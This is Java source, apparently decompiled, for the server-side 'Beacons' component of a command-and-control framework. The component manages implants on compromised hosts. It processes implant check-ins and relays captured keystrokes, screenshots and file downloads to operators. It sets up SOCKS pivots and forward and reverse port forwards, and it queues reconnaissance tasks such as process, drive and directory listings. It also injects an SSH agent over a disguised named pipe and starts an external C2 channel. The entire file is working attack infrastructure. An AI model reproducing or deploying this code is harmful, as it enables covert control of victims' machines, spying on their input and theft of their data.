package server;

import beacon.BeaconData;
import beacon.BeaconSetup;
import beacon.BeaconSocks;
import beacon.CheckinListener;
import beacon.CommandBuilder;
import beacon.TaskBeaconCallback;
import beacon.setup.SSHAgent;
import common.BeaconEntry;
import common.BeaconOutput;
import common.CommonUtils;
import common.Do;
import common.Download;
import common.Keystrokes;
import common.LoggedEvent;
import common.Reply;
import common.Request;
import common.ScListener;
import common.Screenshot;
import common.Timers;
import dialog.DialogUtils;
import extc2.ExternalC2Server;
import java.io.Serializable;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class Beacons implements ServerHook, CheckinListener, Do {
   protected Resources resources;
   protected WebCalls web;
   protected Map beacons = new HashMap();
   protected BeaconData data = null;
   protected BeaconSocks socks = null;
   protected Map cmdlets = new HashMap();
   protected BeaconSetup setup = null;
   protected Map notes = new HashMap();
   protected Map accents = new HashMap();
   protected Set empty = new HashSet();
   protected List initial = new LinkedList();

   public void register(Map var1) {
      var1.put("beacons.remove", this);
      var1.put("beacons.task", this);
      var1.put("beacons.clear", this);
      var1.put("beacons.log_write", this);
      var1.put("beacons.pivot", this);
      var1.put("beacons.pivot_stop", this);
      var1.put("beacons.pivot_stop_port", this);
      var1.put("beacons.mode", this);
      var1.put("beacons.report_posh", this);
      var1.put("beacons.unlink", this);
      var1.put("beacons.start", this);
      var1.put("beacons.stop", this);
      var1.put("beacons.portfwd", this);
      var1.put("beacons.rportfwd", this);
      var1.put("beacons.note", this);
      var1.put("beacons.task_ssh_login", this);
      var1.put("beacons.task_ssh_login_pubkey", this);
      var1.put("beacons.task_ipconfig", this);
      var1.put("beacons.task_ps", this);
      var1.put("beacons.task_ls", this);
      var1.put("beacons.task_ls_default", this);
      var1.put("beacons.task_drives", this);
      var1.put("beacons.task_drives_default", this);
      var1.put("beacons.downloads", this);
      var1.put("beacons.download_cancel", this);
      var1.put("beacons.reset", this);
      var1.put("beacons.whitelist_port", this);
      var1.put("exoticc2.start", this);
      var1.put("beacons.update", this);
      var1.put("beacons.push", this);
   }

   public void checkin(ScListener var1, BeaconEntry var2) {
      synchronized(this) {
         if (!var2.isEmpty()) {
            BeaconEntry var4 = (BeaconEntry)this.beacons.get(var2.getId());
            if (var4 == null || var4.isEmpty()) {
               ServerUtils.addTarget(this.resources, var2.getInternal(), var2.getComputer(), (String)null, var2.getOperatingSystem(), var2.getVersion());
               ServerUtils.addSession(this.resources, var2.toMap());
               if (!var2.isLinked() && var1 != null) {
                  ServerUtils.addC2Info(this.resources, var1.getC2Info(var2.getId()));
               }

               this.resources.broadcast("eventlog", LoggedEvent.BeaconInitial(var2));
               this.initial.add(var2.getId());
               this.resources.process(var2);
            }
         }

         this.beacons.put(var2.getId(), var2);
      }
   }

   public void output(BeaconOutput var1) {
      this.resources.broadcast("beaconlog", var1);
   }

   public boolean moment(String var1) {
      this.resources.broadcast("beacons", this.buildBeaconModel());
      synchronized(this) {
         Iterator var3 = this.initial.iterator();

         while(var3.hasNext()) {
            String var4 = (String)var3.next();
            if ("session".equals(CommonUtils.session(var4))) {
               ServerUtils.fireEvent(this.resources, "ssh_initial", var4);
            } else {
               ServerUtils.fireEvent(this.resources, "beacon_initial", var4);
            }
         }

         this.initial.clear();
         return true;
      }
   }

   public void screenshot(Screenshot var1) {
      this.resources.broadcast("screenshots", var1);
   }

   public void keystrokes(Keystrokes var1) {
      this.resources.broadcast("keystrokes", var1);
   }

   public void download(Download var1) {
      this.resources.broadcast("downloads", var1);
   }

   public void push(String var1, Serializable var2) {
      this.resources.broadcast(var1, var2, true);
   }

   public Map buildBeaconModel() {
      synchronized(this) {
         HashMap var2 = new HashMap();

         BeaconEntry var4;
         for(Iterator var3 = this.beacons.values().iterator(); var3.hasNext(); var2.put(var4.getId(), var4.copy())) {
            var4 = (BeaconEntry)var3.next();
            var4.touch();
            if (this.notes.containsKey(var4.getId())) {
               var4.setNote(this.notes.get(var4.getId()) + "");
            }

            if (this.accents.containsKey(var4.getId())) {
               var4.setAccent(this.accents.get(var4.getId()) + "");
            }
         }

         return var2;
      }
   }

   public BeaconEntry resolve(String var1) {
      synchronized(this) {
         BeaconEntry var3 = (BeaconEntry)this.beacons.get(var1);
         return var3;
      }
   }

   public BeaconEntry resolveEgress(String var1) {
      synchronized(this) {
         BeaconEntry var3 = this.resolve(var1);
         if (var3 == null) {
            return null;
         } else {
            return var3.isLinked() ? this.resolveEgress(var3.getParentId()) : var3;
         }
      }
   }

   public Beacons(Resources var1) {
      this.resources = var1;
      this.web = ServerUtils.getWebCalls(var1);
      Timers.getTimers().every(1000L, "beacons", this);
      var1.put("beacons", this);
      this.setup = new BeaconSetup(this.resources);
      this.setup.getController().setCheckinListener(this);
      this.data = this.setup.getController().getData();
      this.socks = this.setup.getController().getSocks();
      this.resources.broadcast("cmdlets", new HashMap(), true);
   }

   public void update(String var1, long var2, String var4, boolean var5) {
      synchronized(this) {
         BeaconEntry var7 = (BeaconEntry)this.beacons.get(var1);
         if (var7 == null) {
            var7 = new BeaconEntry(var1);
            this.beacons.put(var1, var7);
         }

         if (var2 > 0L) {
            var7.setLastCheckin(var2);
         }

         if (var4 != null) {
            var7.setExternal(var4);
         }

         if (var5) {
            var7.delink();
         }

         if (var4 == null && var7.isEmpty() && !this.empty.contains(var1)) {
            this.empty.add(var1);
            ServerUtils.fireEvent(this.resources, "beacon_initial_empty", var1);
         }

      }
   }

   public void note(String var1, String var2) {
      synchronized(this) {
         this.notes.put(var1, var2);
      }
   }

   public int callback(Request var1, ManageUser var2) {
      return this.setup.getController().register(var1, var2);
   }

   public void call(Request var1, ManageUser var2) {
      String var3;
      if (var1.is("beacons.remove", 1)) {
         var3 = var1.arg(0) + "";
         synchronized(this) {
            BeaconEntry var5 = (BeaconEntry)this.beacons.get(var3);
            if (var5 != null && var5.isLinked()) {
               this.setup.getController().dead_pipe(var5.getParentId(), var3);
            }

            this.beacons.remove(var3);
            this.notes.remove(var3);
            this.accents.remove(var3);
         }
      } else if (var1.is("beacons.reset", 0)) {
         synchronized(this) {
            this.empty = new HashSet();
            this.initial = new LinkedList();
            this.notes = new HashMap();
            this.accents = new HashMap();
            this.beacons = new HashMap();
            this.setup.getController().getPipes().reset();
         }
      } else if (var1.is("beacons.log_write", 1)) {
         synchronized(this) {
            BeaconOutput var4 = (BeaconOutput)var1.arg(0);
            var4.from = var2.getNick();
            var4.touch();
            this.resources.broadcast("beaconlog", var1.arg(0));
         }
      } else if (var1.is("beacons.clear", 1)) {
         var3 = var1.arg(0) + "";
         this.data.clear(var3);
      } else {
         byte[] var21;
         if (var1.is("beacons.task", 2)) {
            var3 = var1.arg(0) + "";
            var21 = (byte[])((byte[])var1.arg(1));
            this.data.task(var3, var21);
         } else {
            int var22;
            if (var1.is("beacons.pivot", 2)) {
               var3 = var1.arg(0) + "";
               var22 = (Integer)var1.arg(1);
               this.socks.pivot(var3, var22);
               this.data.seen(var3);
            } else {
               String var23;
               if (var1.is("beacons.portfwd", 3)) {
                  var3 = var1.arg(0) + "";
                  var23 = var1.arg(1) + "";
                  int var25 = (Integer)var1.arg(2);
                  this.socks.portfwd(var3, var25, var23, var25);
                  this.data.seen(var3);
               } else {
                  String var26;
                  if (var1.is("beacons.rportfwd", 4)) {
                     var3 = var1.arg(0) + "";
                     var22 = (Integer)var1.arg(1);
                     var26 = var1.arg(2) + "";
                     int var6 = (Integer)var1.arg(3);
                     this.socks.rportfwd(var3, var22, var26, var6);
                     this.data.seen(var3);
                  } else if (var1.is("beacons.pivot_stop_port", 1)) {
                     int var24 = Integer.parseInt(var1.arg(0) + "");
                     this.socks.stop_port(var24);
                  } else if (var1.is("beacons.pivot_stop", 1)) {
                     var3 = var1.arg(0) + "";
                     this.socks.stop(var3);
                  } else if (var1.is("beacons.mode", 2)) {
                     var3 = var1.arg(0) + "";
                     var23 = var1.arg(1) + "";
                     this.data.mode(var3, var23);
                  } else {
                     List var27;
                     if (var1.is("beacons.report_posh", 2)) {
                        var3 = var1.arg(0) + "";
                        var27 = (List)var1.arg(1);
                        synchronized(this) {
                           this.cmdlets.put(var3, var27);
                           this.resources.broadcast("cmdlets", new HashMap(this.cmdlets), true);
                        }
                     } else if (var1.is("beacons.unlink", 2)) {
                        var3 = var1.arg(0) + "";
                        var23 = var1.arg(1) + "";
                        this.setup.getController().unlink(var3, var23);
                     } else if (var1.is("beacons.unlink", 3)) {
                        var3 = var1.arg(0) + "";
                        var23 = var1.arg(1) + "";
                        var26 = var1.arg(2) + "";
                        this.setup.getController().unlink(var3, var23, var26);
                     } else {
                        Map var30;
                        if (var1.is("beacons.start", 1)) {
                           var30 = (Map)var1.arg(0);
                           var23 = "success";
                           var26 = DialogUtils.string(var30, "name");
                           if (!this.setup.start(var30)) {
                              var23 = this.setup.getLastError();
                              CommonUtils.print_error("Listener: " + var26 + " failed: " + var23);
                           } else {
                              CommonUtils.print_good("Listener: " + var26 + " started!");
                           }

                           if (var2 != null) {
                              var2.write(var1.reply(var23));
                           }

                           this.resources.call("listeners.set_status", CommonUtils.args(var26, var23));
                        } else if (var1.is("beacons.stop", 1)) {
                           var30 = (Map)var1.arg(0);
                           var23 = DialogUtils.string(var30, "name");
                           this.setup.stop(var23);
                        } else if (var1.is("beacons.note", 2)) {
                           var3 = (String)var1.arg(0);
                           var23 = (String)var1.arg(1);
                           this.note(var3, var23);
                        } else {
                           String var8;
                           if (!var1.is("beacons.task_ssh_login", 6) && !var1.is("beacons.task_ssh_login_pubkey", 6)) {
                              if (var1.is("beacons.task_ipconfig", 1)) {
                                 var3 = var1.arg(0) + "";
                                 var21 = (new TaskBeaconCallback()).IPConfig(this.callback(var1, var2));
                                 this.data.task(var3, var21);
                              } else if (var1.is("beacons.task_ps", 1)) {
                                 var3 = var1.arg(0) + "";
                                 var21 = (new TaskBeaconCallback()).Ps(this.callback(var1, var2));
                                 this.data.task(var3, var21);
                              } else if (var1.is("beacons.task_drives", 1)) {
                                 var3 = var1.arg(0) + "";
                                 var21 = (new TaskBeaconCallback()).Drives(this.callback(var1, var2));
                                 this.data.task(var3, var21);
                              } else if (var1.is("beacons.task_drives_default", 1)) {
                                 var3 = var1.arg(0) + "";
                                 var21 = (new TaskBeaconCallback()).Drives(-1);
                                 this.data.task(var3, var21);
                              } else {
                                 byte[] var31;
                                 if (var1.is("beacons.task_ls", 2)) {
                                    var3 = var1.arg(0) + "";
                                    var23 = var1.arg(1) + "";
                                    var31 = (new TaskBeaconCallback()).Ls(this.callback(var1, var2), var23);
                                    this.data.task(var3, var31);
                                 } else if (var1.is("beacons.task_ls_default", 2)) {
                                    var3 = var1.arg(0) + "";
                                    var23 = var1.arg(1) + "";
                                    var31 = (new TaskBeaconCallback()).Ls(-2, var23);
                                    this.data.task(var3, var31);
                                 } else if (var1.is("beacons.downloads", 1)) {
                                    var3 = var1.arg(0) + "";
                                    var27 = this.setup.getController().getDownloads(var3);
                                    var2.writeNow(var1.reply(var27));
                                 } else {
                                    Iterator var29;
                                    if (var1.is("beacons.download_cancel", 2)) {
                                       var3 = var1.arg(0) + "";
                                       var23 = var1.arg(1) + "";
                                       List var33 = this.setup.getController().getDownloads(var3);
                                       var29 = var33.iterator();

                                       Map var32;
                                       while(var29.hasNext()) {
                                          var32 = (Map)var29.next();
                                          var8 = var32.get("name") + "";
                                          if (!CommonUtils.iswm(var23, var8)) {
                                             var29.remove();
                                          }
                                       }

                                       var29 = var33.iterator();

                                       while(var29.hasNext()) {
                                          var32 = (Map)var29.next();
                                          var8 = var32.get("name") + "";
                                          String var35 = var32.get("fid") + "";
                                          this.setup.getController().getDownloadManager().close(var3, Integer.parseInt(var35));
                                          CommandBuilder var36 = new CommandBuilder();
                                          var36.setCommand(19);
                                          var36.addInteger(Integer.parseInt(var35));
                                          this.data.task(var3, var36.build());
                                          this.output(BeaconOutput.Task(var3, "canceled download of: " + var8));
                                       }
                                    } else if (var1.is("beacons.whitelist_port", 2)) {
                                       var3 = (String)var1.arg(0);
                                       var23 = var1.arg(1) + "";
                                       this.setup.getController().whitelistPort(var3, var23);
                                    } else if (var1.is("exoticc2.start", 2)) {
                                       var3 = (String)var1.arg(0);
                                       var22 = Integer.parseInt(var1.arg(1) + "");
                                       this.setup.initCrypto();
                                       new ExternalC2Server(this.setup, (ScListener)null, var3, var22);
                                    } else if (var1.is("beacons.update", 2)) {
                                       var3 = var1.arg(0) + "";
                                       Map var37 = (Map)var1.arg(1);
                                       synchronized(this) {
                                          var29 = var37.entrySet().iterator();

                                          while(var29.hasNext()) {
                                             Map.Entry var34 = (Map.Entry)var29.next();
                                             if ("_accent".equals(var34.getKey())) {
                                                this.accents.put(var3, var34.getValue());
                                             }
                                          }
                                       }
                                    } else if (var1.is("beacons.push", 0)) {
                                       synchronized(this) {
                                          this.resources.broadcast("beacons", this.buildBeaconModel());
                                       }
                                    } else {
                                       var2.writeNow(new Reply("server_error", 0L, var1 + ": incorrect number of arguments"));
                                    }
                                 }
                              }
                           } else {
                              var3 = var1.arg(0) + "";
                              var23 = var1.arg(1) + "";
                              var26 = var1.arg(2) + "";
                              String var28 = var1.arg(3) + "";
                              int var7 = (Integer)var1.arg(4);
                              var8 = var1.arg(5) + "";
                              boolean var9 = var1.is("beacons.task_ssh_login_pubkey");
                              String var10 = "\\\\%s\\pipe\\session\\" + CommonUtils.garbage("SSHAGENT");
                              SSHAgent var11 = new SSHAgent(this.setup, ServerUtils.getProfile(this.resources), var28, var7, var23, var26, var10, var9);
                              CommandBuilder var12 = new CommandBuilder();
                              if ("x86".equals(var8)) {
                                 var12.setCommand(1);
                              } else {
                                 var12.setCommand(44);
                              }

                              var12.addString(var11.export(var8));
                              this.data.task(var3, var12.build());
                              var12 = new CommandBuilder();
                              var12.setCommand(40);
                              var12.addInteger(0);
                              var12.addShort(27);
                              var12.addShort(30000);
                              var12.addLengthAndString(var11.getStatusPipeName());
                              var12.addLengthAndString("SSH status");
                              this.data.task(var3, var12.build());
                           }
                        }
                     }
                  }
               }
            }
         }
      }

   }
}
